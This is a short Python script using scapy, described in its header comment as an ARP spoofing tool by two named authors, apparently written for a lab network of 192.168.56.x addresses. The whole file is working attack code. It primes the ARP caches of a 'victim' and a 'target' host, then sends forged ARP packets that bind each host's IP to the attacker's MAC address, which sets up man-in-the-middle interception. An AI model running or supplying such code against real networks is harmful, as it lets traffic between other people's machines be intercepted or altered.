# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen

from scapy.all import *
import sys
import time

vIP = '192.168.56.101'
tIP = '192.168.56.102'
oIP = '192.168.56.103'

"""
Return own mac_addresss
@rtype: str
@return: mac address
"""
def get_own_mac_address():
    macs = [get_if_hwaddr(i) for i in get_if_list()]
    for mac in macs:
        if (mac != "00:00:00:00:00:00"):
            return mac
    raise Exception("Failed to obtain local mac address")

def spoofARP(own_mac, victimIP, targetIP):
    sendp([
        Ether() / ARP(op = "who-has", hwsrc = own_mac, psrc = targetIP, pdst = victimIP),
        Ether() / ARP(op = ARP.is_at, hwsrc = own_mac,  psrc = victimIP, pdst = targetIP)])


def fillARPcache(own_mac, victimIP, targetIP):
    sendp([
        Ether() / ARP(op = "who-has", hwsrc = own_mac, psrc = oIP, pdst = victimIP),
        Ether() / ARP(op = "who-has", hwsrc = own_mac, psrc = oIP, pdst = targetIP)])

def main():
    try:
        attacker_mac = get_own_mac_address()
    except Exception as e:
        print(e)
        sys.exit(1)
    fillARPcache(attacker_mac, vIP, tIP) # <= 1 execution
    time.sleep(2)
    spoofARP(attacker_mac, vIP, tIP)

if __name__ == "__main__":
    main()
